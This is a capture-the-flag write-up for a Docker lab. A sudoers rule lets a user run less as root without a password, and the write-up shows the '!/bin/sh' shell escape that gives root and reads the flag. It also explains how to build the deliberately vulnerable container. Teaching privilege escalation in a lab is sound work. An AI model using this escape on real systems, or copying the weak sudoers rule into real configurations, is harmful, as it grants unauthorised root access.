# Misconfigured Sudoers (Challenge 5)

## Description
A misconfigured sudoers rule allows the user to run `/usr/bin/less` as root without a password. This can be exploited to gain a root shell and read the flag.

# Solution
1. Connect to the container:
   ```bash
   docker exec -it challenge5 bash
   ```
2. Check sudo privileges:
   ```bash
   sudo -l
   ```
   You will see that `ctfuser` can run `/usr/bin/less` as root without a password.
3. Run less as root on any readable file:
   ```bash
   sudo /usr/bin/less /etc/hosts
   ```
4. Inside `less`, type:
   ```
   !/bin/sh
   ```
   and press Enter to spawn a root shell.
5. From the root shell, read the flag:
   ```bash
   cat /root/flag.txt
   ```

# Recreating this challenge
1. Create a working directory `challenge5` with a subfolder `app`.
2. Place `flag.txt` in the build context with the desired flag. This will be copied into `/root/flag.txt` with `chmod 600`.
3. Create a sudoers snippet (`ctfuser_sudoers`) containing:
   ```
   ctfuser ALL=(ALL) NOPASSWD: /usr/bin/less
   ```
4. Write a Dockerfile based on `ubuntu:20.04` or similar:
   - Create user `ctfuser`.
   - Install `sudo` and `less`.
   - Copy `flag.txt` to `/root/flag.txt` and set permissions.
   - Copy the sudoers snippet to `/etc/sudoers.d/` with mode `0440`.
   - Set `ctfuser` as the default user and keep the container running.
5. Build the image and run the container.
